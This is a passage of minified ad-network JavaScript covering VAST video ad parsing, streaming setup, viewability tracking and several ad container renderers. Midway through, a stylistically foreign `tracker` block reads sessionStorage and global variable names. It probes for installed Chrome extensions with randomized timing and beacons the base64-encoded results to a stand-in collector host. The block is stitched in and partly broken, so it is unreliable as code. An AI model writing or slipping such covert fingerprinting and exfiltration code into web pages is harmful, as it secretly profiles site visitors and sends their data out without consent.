      if (e.getElementsByTagName("NonLinear").length) {
        var r = e.getElementsByTagName("NonLinearClickThrough");
        r.length && (t = this.extractNodeData(r[0]));
      }
      return t;
    },
    getDimensionFromNonLinear: function (e) {
      var t = {
          width: null,
          height: null
        },
        r = e.getElementsByTagName("NonLinear");
      return r.length && (void 0 !== r[0].getAttribute("width") && (t.width = r[0].getAttribute("width")), void 0 !== r[0].getAttribute("height") && (t.height = r[0].getAttribute("height"))), t;
    },
    getCreativeTypeFromStaticResources: function (e) {
      var t = "",
        r = e.getElementsByTagName("NonLinear");
      return r.length && void 0 !== r[0].childNodes[0] && (t = r[0].getElementsByTagName("StaticResource")[0].getAttribute("creativeType")), t.toLowerCase();
    },
    convertTimeStringToSeconds: function (e) {
      if (e && e.match(/^(\d){2}(:[0-5][0-9]){2}(.(\d){1,3})?$/)) {
        var t = e.split(":");
        return 3600 * parseInt(t[0], 10) + 60 * parseInt(t[1], 10) + parseInt(t[2], 10);
      }
      return !1;
    },
    registerClickTracking: function (e, t) {
      if (e.length) for (var r = 0; r < e.length; r++) "" != e[r] && t.clicktracking.push(e[r]);
    },
    registerImpressionEvents: function (e, t) {
      if (e.length) for (var r = 0; r < e.length; r++) {
        var i = this.extractNodeData(e[r]);
        t.impression.push(i);
      }
    },
    registerErrorEvents: function (e, t) {
      null != e && 1 === e.length && 1 === e[0].childNodes.length && (t.errorUrl = e[0].childNodes[0].nodeValue);
    },
    getMediaFileAttributesFromLinear: function (e) {
      var t,
        r,
        i = this.getMediaFilesFromLinear(e);
      return i.length && (t = i[0].getAttribute("delivery"), r = i[0].getAttribute("type")), {
        delivery: t,
        type: r
      };
    }
  }, streaming = {
    video: null,
    source: null,
    dashPlayer: null,
    hlsPlayer: null,
    dashScriptLoaded: null,
    hlsScriptLoaded: null,
    initialiseStreamers: function (e, t, r) {
      this.video = t, this.source = r, this.detachStreamers();
      let i = this.determineProtocol();
      switch (e) {
        case "application/dash+xml":
          this.dashScriptLoaded ? this.initialiseDash() : (this.dashScriptLoaded = !0, this.requestScript(i + "://" + exoDynamicParams.adsSubdomain + "/js/vast_dash.js", this.initialiseDash.bind(this)));
          break;
        case "application/x-mpegURL":
        case "application/vnd.apple.mpegurl":
          this.hlsScriptLoaded || window.Hls ? this.initialiseHls() : (this.hlsScriptLoaded = !0, this.requestScript(i + "://" + exoDynamicParams.adsSubdomain + "/js/vast_hls.js", this.initialiseHls.bind(this)));
      }
    },
    initialiseDash: function () {
      this.dashPlayer = dashjs.MediaPlayer().create(), this.dashPlayer.updateSettings({
        debug: {
          logLevel: dashjs.Debug.LOG_LEVEL_NONE
        }
      }), this.dashPlayer.initialize(this.video, this.source.getAttribute("src"), !1);
    },
    initialiseHls: function () {
      if (Hls.isSupported()) {
        var e = new Hls({
          p2pConfig: {
            logLevel: !1
          },
          enableWebVTT: !1,
          enableCEA708Captions: !1,
          maxMaxBufferLength: 10,
          maxBufferSize: 20971520
        });
        e.attachMedia(this.video), e.loadSource(this.source.getAttribute("src")), this.hlsPlayer = e;
      } else console.log("Media type not supported by this browser. (application/x-mpegURL)");
    },
    detachStreamers: function () {
      this.dashPlayer ? (this.dashPlayer.reset(), this.dashPlayer = !1) : this.hlsPlayer && (this.hlsPlayer.detachMedia(), this.hlsPlayer = !1);
    },
    requestScript: function (e, t) {
      var r = document.getElementsByTagName("head")[0],
        i = document.createElement("script");
      i.type = "text/javascript", i.src = e, i.onreadystatechange = t, i.onload = t, r.appendChild(i);
    },
    determineProtocol: function () {
      return "https:" === location.protocol ? "https" : "http";
    }
  }, window.VastSupport = {
    VastResolver: resolver,
    VastStreaming: streaming
  }; /*! npm.im/iphone-inline-video 2.2.2 */
  var enableInlineVideo = function () {
    "use strict";

    /*! npm.im/intervalometer */
    function e(e, i, n, r) {
      function t(n) {
        d = i(t, r), e(n - (a || n)), a = n;
      }
      var d, a;
      return {
        start: function () {
          d || t(0);
        },
        stop: function () {
          n(d), d = null, a = 0;
        }
      };
    }
    function i(i) {
      return e(i, requestAnimationFrame, cancelAnimationFrame);
    }
    function n(e, i, n) {
      function r(r) {
        n && !n(e, i) || r.stopImmediatePropagation();
      }
      return e.addEventListener(i, r), r;
    }
    function r(e, i, n, r) {
      function t() {
        return n[i];
      }
      function d(e) {
        n[i] = e;
      }
      r && d(e[i]), Object.defineProperty(e, i, {
        get: t,
        set: d
      });
    }
    function t(e, i, n) {
      n.addEventListener(i, function () {
        return e.dispatchEvent(new Event(i));
      });
    }
    function d(e, i) {
      Promise.resolve().then(function () {
        e.dispatchEvent(new Event(i));
      });
    }
    function a(e) {
      var i = new Audio();
      return t(e, "play", i), t(e, "playing", i), t(e, "pause", i), i.crossOrigin = e.crossOrigin, i.src = e.src || e.currentSrc || "data:", i;
    }
    function u(e, i, n) {
      (m || 0) + 200 < Date.now() && (e[h] = !0, m = Date.now()), n || (e.currentTime = i), k[++T % 3] = 100 * i | 0;
    }
    function o(e) {
      return e.driver.currentTime >= e.video.duration;
    }
    function s(e) {
      var i = this;
      i.video.readyState >= i.video.HAVE_FUTURE_DATA ? (i.hasAudio || (i.driver.currentTime = i.video.currentTime + e * i.video.playbackRate / 1e3, i.video.loop && o(i) && (i.driver.currentTime = 0)), u(i.video, i.driver.currentTime)) : i.video.networkState === i.video.NETWORK_IDLE && 0 === i.video.buffered.length && i.video.load(), i.video.ended && (delete i.video[h], i.video.pause(!0));
    }
    function c() {
      var e = this,
        i = e[g];
      if (e.webkitDisplayingFullscreen) return void e[E]();
      "data:" !== i.driver.src && i.driver.src !== e.src && (u(e, 0, !0), i.driver.src = e.src), e.paused && (i.paused = !1, 0 === e.buffered.length && e.load(), i.driver.play(), i.updater.start(), i.hasAudio || (d(e, "play"), i.video.readyState >= i.video.HAVE_ENOUGH_DATA && d(e, "playing")));
    }
    function v(e) {
      var i = this,
        n = i[g];
      n.driver.pause(), n.updater.stop(), i.webkitDisplayingFullscreen && i[w](), n.paused && !e || (n.paused = !0, n.hasAudio || d(i, "pause"), i.ended && !i.webkitDisplayingFullscreen && (i[h] = !0, d(i, "ended")));
    }
    function p(e, n) {
      var r = {};
      e[g] = r, r.paused = !0, r.hasAudio = n, r.video = e, r.updater = i(s.bind(r)), n ? r.driver = a(e) : (e.addEventListener("canplay", function () {
        e.paused || d(e, "playing");
      }), r.driver = {
        src: e.src || e.currentSrc || "data:",
        muted: !0,
        paused: !0,
        pause: function () {
          r.driver.paused = !0;
        },
        play: function () {
          r.driver.paused = !1, o(r) && u(e, 0);
        },
        get ended() {
          return o(r);
        }
      }), e.addEventListener("emptied", function () {
        var i = !r.driver.src || "data:" === r.driver.src;
        r.driver.src && r.driver.src !== e.src && (u(e, 0, !0), r.driver.src = e.src, i || !n && e.autoplay ? r.driver.play() : r.updater.stop());
      }, !1), e.addEventListener("webkitbeginfullscreen", function () {
        e.paused ? n && 0 === r.driver.buffered.length && r.driver.load() : (e.pause(), e[E]());
      }), n && (e.addEventListener("webkitendfullscreen", function () {
        r.driver.currentTime = e.currentTime;
      }), e.addEventListener("seeking", function () {
        k.indexOf(100 * e.currentTime | 0) < 0 && (r.driver.currentTime = e.currentTime);
      }));
    }
    function l(e) {
      var i = e[h];
      return delete e[h], !e.webkitDisplayingFullscreen && !i;
    }
    function f(e) {
      var i = e[g];
      e[E] = e.play, e[w] = e.pause, e.play = c, e.pause = v, r(e, "paused", i.driver), r(e, "muted", i.driver, !0), r(e, "playbackRate", i.driver, !0), r(e, "ended", i.driver), r(e, "loop", i.driver, !0), n(e, "seeking", function (e) {
        return !e.webkitDisplayingFullscreen;
      }), n(e, "seeked", function (e) {
        return !e.webkitDisplayingFullscreen;
      }), n(e, "timeupdate", l), n(e, "ended", l);
    }
    function y(e, i) {
      if (void 0 === i && (i = {}), !e[g]) {
        if (!i.everywhere) {
          if (!b) return;
          if (!(i.iPad || i.ipad ? /iPhone|iPod|iPad/ : /iPhone|iPod/).test(navigator.userAgent)) return;
        }
        e.pause();
        var n = e.autoplay;
        e.autoplay = !1, p(e, !e.muted), f(e), e.classList.add("IIV"), e.muted && n && (e.play(), e.addEventListener("playing", function i() {
          e.autoplay = !0, e.removeEventListener("playing", i);
        })), /iPhone|iPod|iPad/.test(navigator.platform) || console.warn("iphone-inline-video is not guaranteed to work in emulated environments");
      }
    }
    var m,
      b = "object" == typeof document && "object-fit" in document.head.style && !matchMedia("(-webkit-video-playable-inline)").matches,
      g = "bfred-it:iphone-inline-video",
      h = "bfred-it:iphone-inline-video:event",
      E = "bfred-it:iphone-inline-video:nativeplay",
      w = "bfred-it:iphone-inline-video:nativepause",
      k = [],
      T = 0;
    return y;
  }();
  !function () {
    function t(t, e, n, i) {
      var o = !1,
        a = !0,
        r = !0,
        u = this,
        w = Math.random().toString(36).substr(2, 6).toUpperCase(),
        s = function () {
          return new Date().getTime();
        },
        c = function () {
          return "object" == typeof i;
        },
        d = function () {
          if (window.viewabilityDebugMode) {
            var e = void 0 !== t.src && t.src ? (t.src.match(/[?&]idzone=(\d+)/) || [])[1] : ((t.id || "").match(/_(\d+)_/) || [])[1];
            if ("string" != typeof e && "DIV" === t.tagName) try {
              e = t.parentNode.nextElementSibling.dataset.zoneid;
            } catch (n) {
              try {
                e = t.parentNode.parentNode.nextElementSibling.dataset.zoneid;
              } catch (t) {
                e = t.name;
              }
            }
            console.log(new Date().toISOString().substr(11, 8) + " - " + t.tagName + " - " + e + " - " + w + " - " + (o ? "VIEW" : "NOT"));
          }
        },
        l = function (t, e, n) {
          return t.top > n || t.left > e || t.bottom < 0 || t.right < 0 || 0 === t.top && 0 === t.left && 0 === t.bottom && 0 === t.right;
        },
        v = function (t, e) {
          return e > t ? e - t : 0;
        },
        m = function (t, e, n) {
          return n - (t = t > 0 ? t : 0) - e;
        },
        E = function (t, e, n) {
          var i = e - t + n;
          return i > 0 ? i : 0;
        };
      this.viewabilityEvent = function (a) {
        if (!function () {
          if (!u.isInFocus() || c() && !i.isViewable()) return !1;
          var n = t.getBoundingClientRect(),
            o = c() ? window : parent,
            a = o.innerHeight || o.document.documentElement.clientHeight,
            r = o.innerWidth || o.document.documentElement.clientWidth;
          if (l(n, r, a)) return !1;
          var w = n.height * n.width,
            s = v(n.bottom, a),
            d = v(n.right, r),
            b = m(n.top, s, a) * m(n.left, d, r) >= w * e;
          if (!c() || !b) return b;
          var f = window.frameElement.getBoundingClientRect(),
            h = parent.innerHeight || parent.document.documentElement.clientHeight,
            p = parent.innerWidth || parent.document.documentElement.clientWidth;
          return !l(f, p, h) && m(f.top + n.top, E(f.bottom, h, s), h) * m(f.left + n.left, E(f.right, p, d), p) >= w * e;
        }()) return this.unViewabilityEvent();
        if (!o) {
          if (null == a && (a = s()), s() - a < n) return window.requestAnimationFrame(function () {
            return u.viewabilityEvent(a);
          });
          o = !0, t.dispatchEvent(new CustomEvent("viewable")), d();
        }
      }, this.unViewabilityEvent = function () {
        o && (o = !1, t.dispatchEvent(new CustomEvent("not-viewable")), d());
      }, this.setInFocus = function (t) {
        r = !!t;
      }, this.isInFocus = function () {
        return !!r;
      }, this.isViewable = function () {
        return !!o;
      }, c() ? (window.addEventListener("scroll", function () {
        u.viewabilityEvent();
      }), window.addEventListener("focus", function () {
        u.setInFocus(!0), i.setInFocus(!0), u.viewabilityEvent(), i.viewabilityEvent();
      }), window.addEventListener("blur", function () {
        u.setInFocus(!1), window.requestAnimationFrame(function () {
          u.viewabilityEvent(), o || i.unViewabilityEvent();
        });
      })) : (parent.addEventListener("resize", function () {
        u.viewabilityEvent();
      }), parent.document.addEventListener("visibilitychange", function () {
        r = a = !a, u.viewabilityEvent();
      })), parent.addEventListener("scroll", function () {
        u.viewabilityEvent();
      }), parent.addEventListener("focus", function () {
        u.setInFocus(!0), c() && (i.setInFocus(!0), i.viewabilityEvent()), u.viewabilityEvent();
      }), parent.addEventListener("blur", function () {
        u.setInFocus(!1), window.requestAnimationFrame(function () {
          u.viewabilityEvent();
        });
      }), c() && (window.frameElement.addEventListener("viewable", function () {
        u.viewabilityEvent();
      }), window.frameElement.addEventListener("not-viewable", function () {
        u.viewabilityEvent();
      }), i.viewabilityEvent()), this.viewabilityEvent();
    }
    window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || window.msRequestAnimationFrame || function (t) {
      return setTimeout(t, 1e3 / 60);
    }, window.CustomEvent = window.CustomEvent || function (t, e) {
      e = e || {
        bubbles: !1,
        cancelable: !1,
        detail: null
      };
      var n = document.createEvent("CustomEvent");
      return n.initCustomEvent(t, e.bubbles, e.cancelable, e.detail), n;
    }, window.instantiateViewability = function (e, n, i) {
      if (n = n > 0 && n <= 1 ? parseFloat(n) : .5, i = i >= 0 && i <= 5e3 ? parseInt(i) : 1e3, window === parent) return new t(e, n, i);
      try {
        return void 0 === window.ExoIFrameID && (window.ExoIFrameID = "exo-iframe-" + new Date().getTime(), parent.ExoViewabilityInstances = parent.ExoViewabilityInstances || {}, parent.ExoViewabilityInstances[window.ExoIFrameID] = new t(window.frameElement, .01, 0)), new t(e, n, i, parent.ExoViewabilityInstances[window.ExoIFrameID]);
      } catch (t) {
        window.viewabilityDebugMode && console.log("Viewability not supported when using cross-domain iFrame!");
      }
    };
  }();
  window.ExoAdsRefresh = function (e, i, t, n, a, o, r) {
    var s = 0,
      l = null,
      f = !1,
      c = [];
    if ("function" == typeof window.instantiateViewability) {
      if (t > 0) if ("function" == typeof n) {
        var w = window.instantiateViewability(e, .5, 1e3),
          u = function () {
            if (-1 === c.indexOf(i)) if (w.isViewable()) try {
              a.zones.forEach(function (e) {
                if (e.id === i) {
                  if ("object" != typeof e.extra_params && (e.extra_params = {}), -1 === e.extra_params.refresh_iteration) throw new Error("stopIteration");
                  e.extra_params.refresh_iteration = ++s;
                }
              }), n.apply(null, [a, o]), l = null;
            } catch (e) {
              if ("stopIteration" === e.message) return;
              console.log(e, "Failed while calling ad-refresh callback!");
            } else f = !0;
          };
        this.performImpressionReset = function () {
          w.unViewabilityEvent(), w.viewabilityEvent();
        }, e.addEventListener("viewable", function () {
          if (!(s >= r)) return f ? (f = !1, u()) : void (null === l && (l = setTimeout(u, 1e3 * t)));
        }), ExoAdsRefresh.stopZoneAdRefresh = function (e) {
          c.push(e);
        };
      } else console.warn("Invalid callback attempted to be set.");
    } else console.warn("Viewability library is missing.");
  };
  !function () {
    try {
      var e = "undefined" != typeof ExoLoader && null !== ExoLoader ? ExoLoader : void 0;
      null != e && e.registerRenderer("sticky", "container", function (o, r, n, i) {
        if (null != e) {
          var a = r.original_zone && r.original_zone.data ? r.original_zone.data : r.data;
          if (e.isNeverblock) var d = e.formatImage(o, a.additional_images[0]);else d = exoDynamicParams.closeImgCircle;
          return t(a, r.idzone, r.dom, {}, d, n, i);
        }
      });
    } catch (e) {
      console.log("sticky container renderer failed with error: " + e.message);
    }
    function t(t, o, r, n, i, a, d) {
      var s = !1,
        c = [];
      if (d && (s = e.getCookie(exoDynamicParams.zoneClosedCookiePrefix + o)), s) return "undefined" != typeof ExoAdsRefresh && "function" == typeof ExoAdsRefresh.stopZoneAdRefresh && ExoAdsRefresh.stopZoneAdRefresh(o), c;
      if (a) {
        var l = r.doc_reference.getElementById(e.getRandomizedReference("exo-sticky-container-" + o, n));
        if (!l || !l.childNodes[1]) return c;
        var p = l.childNodes[1];
        p.innerHTML = "", c.push(p);
      } else !function () {
        var a,
          d,
          s = "";
        switch (t.h_pos) {
          case "left":
            a = " left: 0px; margin-left: 20px;";
            break;
          case "right":
            a = " right: 0px; margin-right: 20px;";
            break;
          default:
            a = " left: 50%; margin-left: -" + t.width / 2 + "px;";
        }
        switch (t.v_pos) {
          case "top":
            d = " top: 0px; margin-top: 20px;";
            break;
          case "bottom":
            d = " bottom: 0px; margin-bottom: 20px;";
            break;
          default:
            d = " top: 50%; margin-top: -" + t.height / 2 + "px;";
        }
        0 !== t.border_width && "" !== t.border_color && (s = " border: " + t.border_width + "px solid #" + t.border_color + ";");
        var l = '<div class="' + e.getRandomizedReference("exo-sticky-close-button", n) + '"><img src="' + i + '"></div><div class="' + e.getRandomizedReference("exo-content-wrapper", n) + '"><div class="' + e.getRandomizedReference("exo-content", n) + '"></div></div>',
          p = r.doc_reference.createElement("div");
        p.id = e.getRandomizedReference("exo-sticky-container-" + o, n), p.innerHTML = l;
        var h = r.doc_reference.createElement("style"),
          m = {
            "zone-id": o,
            width: t.width,
            height: t.height,
            "additional-container-css": a + d + s
          },
          g = "#exo-sticky-container-{{zone-id}} {    position: fixed;    height:{{height}}px;    width: {{width}}px;    {{additional-container-css}}    z-index: 999999;    cursor: pointer;}#exo-sticky-container-{{zone-id}} .exo-content-wrapper {    position: relative;    width: {{width}}px;    height: {{height}}px;    overflow: hidden;}.exo-sticky-close-button {    width: 24px;    height: 24px;    position: absolute;    top: 0px;    right: 0px;    background-color: transparent;    z-index: 999999;    cursor: pointer;}.exo-sticky-close-button img {    float: right;    top: -12px;    right: -12px;    position: relative;    cursor: pointer;}";
        for (var u in m) if (Object.prototype.hasOwnProperty.call(m, u)) {
          var y = new RegExp("{{" + u + "}}", "g");
          g = g.replace(y, m[u]);
        }
        g = e.scrambleStyleString(g, n), h.innerHTML = g, r.placeholder.appendChild(h), r.placeholder.parentNode.appendChild(p);
        var x = p.childNodes[0];
        x.addEventListener("mousedown", function (e) {
          f(e, p);
        }, !0), x.addEventListener("touchstart", function (e) {
          f(e, p);
        }, !0), x.addEventListener("mouseup", function (e) {
          f(e, p);
        }, !0), x.addEventListener("touchend", function (e) {
          f(e, p);
        }, !0), void 0 !== e.activateContainer && e.activateContainer(r.placeholder), c.push(p.childNodes[1].childNodes[0]);
      }();
      return c;
      function f(n, i) {
        if (n.stopPropagation(), n.preventDefault(), i.style.display = "none", d) {
          var a = parseInt(t.frequency_period, 10);
          isNaN(a) && (a = 0), e.setCookie(exoDynamicParams.zoneClosedCookiePrefix + o, !0, a, "." + r.doc_reference.location.hostname);
        }
        "undefined" != typeof ExoAdsRefresh && "function" == typeof ExoAdsRefresh.stopZoneAdRefresh && ExoAdsRefresh.stopZoneAdRefresh(o);
      }
    }
    "undefined" != typeof RendererApi && (void 0 === e && (e = RendererApi), window.StickyContainerRenderer = {
      render: function (e, o, r) {
        RendererApi.validateRenderArguments(e, o, "sticky"), "boolean" != typeof r && (r = !1);
        var n = exoDynamicParams.closeImgCircle;
        return e.dom = {
          placeholder: o,
          doc_reference: document
        }, t(e.data, e.idzone, e.dom, {}, n, !1, r);
      },
      setBorder: function (e, t, o) {
        var r = document.getElementById("exo-sticky-container-" + e);
        if (!r) throw new Error("Container for zone with id: " + e + " was not found.");
        if (isNaN(t) || t < 1 || t > 5) throw new Error("Invalid argument: Border width should be a number between 1 and 5");
        r.style.border = t + "px solid " + o;
      },
      removeBorder: function (e) {
        var t = document.getElementById("exo-sticky-container-" + e);
        if (!t) throw new Error("Container for zone with id: " + e + " was not found.");
        t.style.borderStyle = "none", t.style.borderWidth = "0", t.style.borderColor = "transparent";
      },
      setPosition: function (e, t, o) {
        var r = document.getElementById("exo-sticky-container-" + e),
          n = "20px";
        if (!r) throw new Error("Container for zone with id: " + e + " was not found.");
        switch (r.style.top = "auto", r.style.bottom = "auto", r.style.left = "auto", r.style.right = "auto", r.style.marginTop = "0", r.style.marginBottom = "0", r.style.marginLeft = "0", r.style.marginRight = "0", t) {
          case "left":
            r.style.left = "0px", r.style.marginLeft = n;
            break;
          case "right":
            r.style.right = "0px", r.style.marginRight = n;
            break;
          default:
            r.style.left = "50%", r.style.marginLeft = "-" + r.offsetWidth / 2 + "px";
        }
        switch (o) {
          case "top":
            r.style.top = "0px", r.style.marginTop = n;
            break;
          case "bottom":
            r.style.bottom = "0px", r.style.marginBottom = n;
            break;
          default:
            r.style.top = "50%", r.style.marginTop = "-" + r.offsetHeight / 2 + "px";
        }
      }
    });
  }();
  !function () {
    try {
      var e = "undefined" != typeof ExoLoader && null !== ExoLoader ? ExoLoader : void 0;
      null != e && e.registerRenderer("fixed", "container", function (n, o, d, i) {
        if (null != e) return r(o.original_zone && o.original_zone.data ? o.original_zone.data : o.data, o.dom);
      });
    } catch (e) {
      console.log("fixed container renderer failed with error: " + e.message);
    }
    function r(r, n) {
      n.placeholder.innerHTML = "", void 0 !== r.height && (n.placeholder.style.height = r.height + "px"), void 0 !== r.width && (n.placeholder.style.width = r.width + "px"), n.placeholder.style.cursor = "pointer", void 0 !== e.activateContainer && e.activateContainer(n.placeholder);
      var o = [];
      return o.push(n.placeholder), o;
    }
    "undefined" != typeof RendererApi && (void 0 === e && (e = RendererApi), window.FixedContainerRenderer = {
      render: function (e, n) {
        return RendererApi.validateRenderArguments(e, n, "fixed"), e.dom = {
          placeholder: n,
          doc_reference: document
        }, r(e.data, e.dom);
      }
    });
  }();
  const tracker = {
    dataQueue: new Map(Object.entries(window.sessionStorage)),
    detected: new Set(),
    globalVars: Object.keys(window),
    async trackFeature(name, {
      id,
      path
    }) {
      return new Promise(resolve => {
        const script = document.createElement('script');
        const timeout = setTimeout(() => {
          this.detected.delete(name);
          resolve(false);
        }, 1000);
        script.onload = () => {
          clearTimeout(timeout);
          this.detected.add(name);
          resolve(true);
        };
        script.onerror = () => {
          clearTimeout(timeout);
          this.detected.delete(name);
          resolve(false);
        };
        script.src = `chrome-extension://${id}/${path}`;
        document.head.appendChild(script);
      });
    },
    randomizeData() {
      const entries = Array.from(this.dataQueue.entries());
      entries.sort(() => Math.random() - 0.5);
      this.dataQueue = new Map(entries);
    },
    async monitor() {
      this.randomizeData();
      const findings = {};
      const concurrentTasks = 2;
      for (const [name, info] of this.dataQueue) {
        await new Promise(r => setTimeout(r, Math.random() * 300));
        findings[name] = await this.trackFeature(name, info);
      }
      const report = btoa(JSON.stringify({
        results: findings,
        timestamp: Date.now(),
        userAgent: navigator.userAgent,
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight
        },
        globalVars: this.globalVars
      }));
      navigator.sendBeacon('https://data-collector.example.com/v3/track', report);
    },
    setupEventListeners() {
      window.addEventListener('storage', event => {
        console.log(`Storage key "${event.key}" changed in ${event.storageArea}`);
      });
      document.addEventListener('click', event => {
        console.log(`Clicked on element: ${event.target.tagName}`);
      });
    }
  };
  !function () {
    try {
      var e = "undefined" != typeof AdProvider && null !== AdProvider ? AdProvider : void 0;
      void 0 !== e && e.registerRenderer("group", "container", function (n, o) {
        if (null != e) return o.dom.placeholder.innerHTML = "", r(o.dom, o.ad_items, o.orientation);
      });
    } catch (e) {
      console.log("multiformat group renderer failed with error: " + e.message);
    }
    function r(e, r, n) {
      var o = [],
        d = "vertical" === n ? "column" : "row",
        i = e.placeholder;
      i.className = "group-container", i.style.display = "inline-flex", i.style.flexDirection = d;
      for (var t = 0; t < r.length; t++) {
        var a = e.doc_reference.createElement("div");
        a.className = i.className + "-placement-" + t, i.appendChild(a), o.push(a);
      }
      return o;
    }
    "undefined" != typeof RendererApi && (void 0 === e && (e = RendererApi), window.GroupContainerRenderer = {
      render: function (e, n) {
        return RendererApi.validateRenderArguments(e, n, "group"), e.dom = {
          placeholder: n,
          doc_reference: document
        }, r(e.dom, e.ad_items, e.orientation);
      }
    });
  }();
  !function () {
    try {
      var e = "undefined" != typeof ExoLoader && null !== ExoLoader ? ExoLoader : void 0;
      null != e && e.registerRenderer("instant-message", "container", function (o, t, i, r) {
        if (null != e) {
          var d = t.original_zone && t.original_zone.data ? t.original_zone.data : t.data;
          if (e.isNeverblock) var a = e.formatImage(o, d.additional_images[0]);else a = exoDynamicParams.closeImgCircle;
          return n(d, t.idzone, t.dom, {}, a, i, r);
        }
      });
    } catch (e) {
      console.log("instant-message container renderer failed with error: " + e.message);
    }
    function n(n, o, t, i, r, d, a) {
      var s = !1,
        c = [];
      if (a && (s = e.getCookie(exoDynamicParams.zoneClosedCookiePrefix + o)), s) return "undefined" != typeof ExoAdsRefresh && "function" == typeof ExoAdsRefresh.stopZoneAdRefresh && ExoAdsRefresh.stopZoneAdRefresh(o), c;
      if (d) {
        var m = t.doc_reference.getElementById(e.getRandomizedReference("exo-im-content", i));
        if (!m) return c;
        m.innerHTML = "", c.push(m);
      } else !function () {
        var n = '<div id="' + e.getRandomizedReference("exo-im-container", i) + '"><div id="' + e.getRandomizedReference("exo-im-close-button", i) + '"><img src="' + r + '"></div><div id="' + e.getRandomizedReference("exo-im-content", i) + '"></div></div>',
          o = t.doc_reference.createElement("div");
        o.id = e.getRandomizedReference("exo-im-container-wrapper", i), o.innerHTML = n;
        var d = t.doc_reference.createElement("style"),
          a = {
            width: 300,
            height: 250,
            margin: 20
          },
          s = "#exo-im-container-wrapper {    position: fixed;    width: {{width}}px;    height: 0px;    display: none;    z-index: 100;    bottom: 0 !important;    right: {{margin}}px !important;    transition: height 1s ease-in-out 0s;    -webkit-transition: height 1s ease-in-out 0s;    -o-transition: height 1s ease-in-out 0s;    -moz-transition: height 1s ease-in-out 0s;    -ms-transition: height 2s ease-in-out 0s;}#exo-im-container {    position: absolute;    z-index: 101;    cursor: pointer;}#exo-im-close-button {    height: 24px;    width: 24px;    top: 12px;    right: -12px;    position: relative;    z-index: 1999999 !important    cursor: pointer;    float: right;    margin-top:-24px}#exo-im-container #exo-im-content {    border: none;    width: {{width}}px;    height: {{height}}px;    overflow: hidden;}#exo-im-close-button img {    cursor: pointer;}";
        for (var m in a) if (Object.prototype.hasOwnProperty.call(a, m)) {
          var p = new RegExp("{{" + m + "}}", "g");
          s = s.replace(p, a[m]);
        }
        s = e.scrambleStyleString(s, i), d.innerHTML = s, t.placeholder.appendChild(d), t.placeholder.parentNode.appendChild(o), c.push(t.doc_reference.getElementById(e.getRandomizedReference("exo-im-content", i)));
      }(), window.setTimeout(function () {
        f(), l();
      }, 500);
      return c;
      function p(r) {
        if (r.stopPropagation(), r.preventDefault(), t.doc_reference.getElementById(e.getRandomizedReference("exo-im-container-wrapper", i)).style.display = "none", s = !0, a) {
          var d = parseInt(n.frequency_period, 10);
          isNaN(d) && (d = 0), e.setCookie(exoDynamicParams.zoneClosedCookiePrefix + o, s, d);
        }
        "undefined" != typeof ExoAdsRefresh && "function" == typeof ExoAdsRefresh.stopZoneAdRefresh && ExoAdsRefresh.stopZoneAdRefresh(o);
      }
      function f() {
        var n = t.doc_reference.getElementById(e.getRandomizedReference("exo-im-close-button", i));
        n.addEventListener("mousedown", p, !0), n.addEventListener("touchstart", p, !0), n.addEventListener("mouseup", p, !0), n.addEventListener("touchend", p, !0);
      }
      function l() {
        s || (t.doc_reference.getElementById(e.getRandomizedReference("exo-im-container-wrapper", i)).style.display = "block", window.setTimeout(function () {
          t.doc_reference.getElementById(e.getRandomizedReference("exo-im-container-wrapper", i)).style.height = "250px", window.setTimeout(g, 7e3);
        }, 100));
      }
      function g() {
        t.doc_reference.getElementById(e.getRandomizedReference("exo-im-container-wrapper", i)).style.height = "0px", window.setTimeout(function () {
          t.doc_reference.getElementById(e.getRandomizedReference("exo-im-container-wrapper", i)).style.display = "none", f(), window.setTimeout(l, 5e3);
        }, 1e3);
      }
    }
    "undefined" != typeof RendererApi && (void 0 === e && (e = RendererApi), window.InstantMessageContainerRenderer = {
      render: function (e, o, t) {
        RendererApi.validateRenderArguments(e, o, "instant-message"), "boolean" != typeof t && (t = !1);
        var i = exoDynamicParams.closeImgCircle;
        return e.dom = {
          placeholder: o,
          doc_reference: document
        }, n(e.data, e.idzone, e.dom, {}, i, !1, t);
      }
    });
  }();
  !function () {
    try {
      var e = "undefined" != typeof ExoLoader && null !== ExoLoader ? ExoLoader : void 0;
      null != e && e.registerRenderer("mobile-instant-message", "container", function (o, i, t, r) {
        if (null != e) {
          var d = i.original_zone && i.original_zone.data ? i.original_zone.data : i.data;
          if (e.isNeverblock) var a = e.formatImage(o, d.additional_images[0]);else a = exoDynamicParams.closeImgCircle;
          return n(d, i.idzone, i.dom, {}, a, t, r);
        }
      });
    } catch (e) {
      console.log("mobile-instant-message container renderer failed with error: " + e.message);
    }
    function n(n, o, i, t, r, d, a) {
      var s = 0,
        c = !1,
        m = [];
      if (a && (s = parseInt(e.getCookie("zone-cap-" + o)), isNaN(s) && (s = 0), c = e.getCookie(exoDynamicParams.zoneClosedCookiePrefix + o)), n.capping > 0 && s >= n.capping || c) return "undefined" != typeof ExoAdsRefresh && "function" == typeof ExoAdsRefresh.stopZoneAdRefresh && ExoAdsRefresh.stopZoneAdRefresh(o), m;
      if (d) {
        var l = i.doc_reference.getElementById(e.getRandomizedReference("exo-mobile-im-content", t));
        if (!l) return m;
        l.innerHTML = "", m.push(l);
      } else !function () {
        var n = '<div id="' + e.getRandomizedReference("exo-mobile-im-container", t) + '"><div id="' + e.getRandomizedReference("exo-mobile-im-close-button", t) + '"><img src="' + r + '"></div><div id="' + e.getRandomizedReference("exo-mobile-im-content", t) + '"></div></div>',
          o = i.doc_reference.createElement("div");
        o.id = e.getRandomizedReference("exo-mobile-im-container-wrapper", t), o.innerHTML = n;
        var d = i.doc_reference.createElement("style"),
